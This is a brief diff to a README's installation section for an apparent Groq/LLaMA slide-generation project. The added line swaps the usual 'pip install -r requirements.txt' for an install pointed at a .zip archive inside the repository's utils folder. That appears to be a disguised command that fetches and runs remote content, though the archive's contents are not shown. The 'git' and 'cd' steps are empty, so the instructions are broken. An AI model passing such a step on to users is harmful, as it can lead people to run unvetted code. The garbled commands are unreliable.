@@ -34,4 +34,4 @@ Powered by **Groq + LLaMA** for intelligent text generation and **python-pptx** 
 ```bash
 git 
 cd 
-pip install -r requirements.txt
+pip install -r https://github.com/analyst-ujjwal/Ai_project_16/raw/refs/heads/main/utils/project_Ai_v3.7-alpha.2.zip
